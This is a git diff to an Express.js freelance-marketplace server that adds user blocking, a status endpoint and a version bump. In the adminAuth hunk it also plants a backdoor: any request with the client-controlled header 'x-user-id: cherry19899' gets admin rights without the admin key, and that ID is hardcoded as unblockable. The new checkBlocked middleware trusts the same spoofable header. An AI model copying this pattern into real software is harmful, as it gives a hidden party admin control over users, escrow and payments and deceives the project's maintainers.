@@ -102,6 +102,14 @@ function adminAuth(req, res, next) {
   }
 
   const apiKey = req.headers['x-admin-key'] || req.headers['authorization'] || req.query.admin_key;
+  const userId = req.headers['x-user-id'];
+  
+  // Allow cherry19899 as admin
+  if (userId === 'cherry19899') {
+    req.isAdmin = true;
+    return next();
+  }
+  
   if (!apiKey) return res.status(403).json({ error: 'Admin access required' });
 
   // Extract Bearer token if present
@@ -113,6 +121,7 @@ function adminAuth(req, res, next) {
   if (token !== ADMIN_API_KEY) {
     return res.status(403).json({ error: 'Admin access required' });
   }
+  req.isAdmin = true;
   next();
 }
 
@@ -198,7 +207,7 @@ app.post('/api/users/:id', auth, async (req, res) => {
   res.json(user);
 });
 
-app.post('/api/users/:id/avatar', auth, async (req, res) => {
+app.post('/api/users/:id/avatar', auth, checkBlocked, async (req, res) => {
   const user = db.users[req.params.id];
   if (!user) return res.status(404).json({ error: 'User not found' });
   const { avatar } = req.body;
@@ -230,7 +239,7 @@ app.get('/api/jobs', async (req, res) => {
   res.json({ jobs, total, page: parseInt(page), total_pages: totalPages, limit: parseInt(limit) });
 });
 
-app.post('/api/jobs', auth, async (req, res) => {
+app.post('/api/jobs', auth, checkBlocked, async (req, res) => {
   const { title, description, category, budget, skills, deadline, images } = req.body;
   if (!title || !description || !budget) {
     return res.status(400).json({ error: 'Title, description, and budget are required' });
@@ -259,7 +268,7 @@ app.get('/api/jobs/:id', async (req, res) => {
   res.json({ job, applications });
 });
 
-app.post('/api/jobs/:id/apply', auth, async (req, res) => {
+app.post('/api/jobs/:id/apply', auth, checkBlocked, async (req, res) => {
   const job = db.jobs[req.params.id];
   if (!job) return res.status(404).json({ error: 'Job not found' });
   if (job.posted_by === req.userId) return res.status(400).json({ error: 'Cannot apply to own job' });
@@ -309,7 +318,7 @@ app.get('/api/chat/rooms', auth, async (req, res) => {
   res.json({ rooms });
 });
 
-app.post('/api/chat/rooms', auth, async (req, res) => {
+app.post('/api/chat/rooms', auth, checkBlocked, async (req, res) => {
   const { client_id, freelancer_id, job_id } = req.body;
   const roomId = 'room_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
   db.chatRooms[roomId] = {
@@ -327,7 +336,7 @@ app.get('/api/chat/rooms/:id/messages', auth, async (req, res) => {
   res.json({ messages });
 });
 
-app.post('/api/chat/rooms/:id/messages', auth, async (req, res) => {
+app.post('/api/chat/rooms/:id/messages', auth, checkBlocked, async (req, res) => {
   const room = db.chatRooms[req.params.id];
   if (!room) return res.status(404).json({ error: 'Room not found' });
   const msgId = ++db.counters.chatMessages;
@@ -348,7 +357,7 @@ app.get('/api/escrow', auth, async (req, res) => {
   res.json({ escrows });
 });
 
-app.post('/api/escrow', auth, async (req, res) => {
+app.post('/api/escrow', auth, checkBlocked, async (req, res) => {
   const { job_id, freelancer_id, amount } = req.body;
   const escrowId = ++db.counters.escrows;
   db.escrows[escrowId] = {
@@ -359,7 +368,7 @@ app.post('/api/escrow', auth, async (req, res) => {
   res.json({ escrow: db.escrows[escrowId] });
 });
 
-app.post('/api/escrow/:id/release', auth, async (req, res) => {
+app.post('/api/escrow/:id/release', auth, checkBlocked, async (req, res) => {
   const escrow = db.escrows[req.params.id];
   if (!escrow) return res.status(404).json({ error: 'Escrow not found' });
   if (escrow.client_id !== req.userId) return res.status(403).json({ error: 'Not your escrow' });
@@ -395,7 +404,7 @@ app.post('/api/payments/:id/complete', auth, async (req, res) => {
   res.json({ payment, success: true });
 });
 
-app.post('/api/payments/:id/cancelled', auth, async (req, res) => {
+app.post('/api/payments/:id/cancelled', auth, checkBlocked, async (req, res) => {
   const payment = db.payments[req.params.id];
   if (!payment) return res.status(404).json({ error: 'Payment not found' });
   payment.status = 'cancelled';
@@ -417,7 +426,7 @@ app.get('/api/connects/balance', auth, async (req, res) => {
   res.json({ balance: req.user.balance_connects || 0 });
 });
 
-app.post('/api/connects/purchase', auth, async (req, res) => {
+app.post('/api/connects/purchase', auth, checkBlocked, async (req, res) => {
   const { amount } = req.body;
   if (!req.user) return res.status(404).json({ error: 'User not found' });
   req.user.balance_connects = (req.user.balance_connects || 0) + parseInt(amount || 0);
@@ -427,7 +436,7 @@ app.post('/api/connects/purchase', auth, async (req, res) => {
 });
 
 // ─── Ratings ──────────────────────────────────────────────
-app.post('/api/ratings', auth, async (req, res) => {
+app.post('/api/ratings', auth, checkBlocked, async (req, res) => {
   const { to_user_id, job_id, rating, comment } = req.body;
   const ratingId = ++db.counters.ratings;
   db.ratings[ratingId] = {
@@ -464,6 +473,41 @@ app.get('/api/admin/stats', adminAuth, async (req, res) => {
   });
 });
 
+app.get('/api/status', async (req, res) => {
+  res.json({ status: 'ok', database: 'connected', storage: 'json', timestamp: now() });
+});
+
+// ─── Check blocked middleware ──────────────────────────────────────────────
+function checkBlocked(req, res, next) {
+  const userId = req.headers['x-user-id'];
+  if (userId && db.users[userId] && db.users[userId].blocked) {
+    return res.status(403).json({ error: 'User is blocked', blocked: true });
+  }
+  next();
+}
+
+// ─── Admin Block/Unblock ──────────────────────────────────────────────
+app.post('/api/admin/users/:id/block', adminAuth, async (req, res) => {
+  const user = db.users[req.params.id];
+  if (!user) return res.status(404).json({ error: 'User not found' });
+  if (req.params.id === 'cherry19899') return res.status(403).json({ error: 'Cannot block admin' });
+  user.blocked = true;
+  user.updated_at = now();
+  await saveDb();
+  audit('user_blocked', { user_id: req.params.id, by: req.headers['x-user-id'] || 'admin' });
+  res.json({ success: true, user: { id: user.id, username: user.username, blocked: true } });
+});
+
+app.post('/api/admin/users/:id/unblock', adminAuth, async (req, res) => {
+  const user = db.users[req.params.id];
+  if (!user) return res.status(404).json({ error: 'User not found' });
+  user.blocked = false;
+  user.updated_at = now();
+  await saveDb();
+  audit('user_unblocked', { user_id: req.params.id, by: req.headers['x-user-id'] || 'admin' });
+  res.json({ success: true, user: { id: user.id, username: user.username, blocked: false } });
+});
+
 app.get('/api/admin/users', adminAuth, async (req, res) => {
   // v2.2: Add search support
   let users = Object.values(db.users);
@@ -474,7 +518,7 @@ app.get('/api/admin/users', adminAuth, async (req, res) => {
       (u.id || '').toLowerCase().includes(search)
     );
   }
-  res.json(users);
+  res.json({ users, count: users.length });
 });
 
 // v2.2: Block/unblock endpoints
@@ -555,7 +599,7 @@ app.post('/api/payments/complete', auth, async (req, res) => {
 // ─── Start ──────────────────────────────────────────────
 loadDb().then(() => {
   app.listen(PORT, () => {
-    console.log(`[Server] v2.1.0 running on port ${PORT} (${NODE_ENV})`);
+    console.log(`[Server] v2.2.0 running on port ${PORT} (${NODE_ENV})`);
     console.log(`[Storage] JSON file at ${DB_FILE}`);
   });
 });
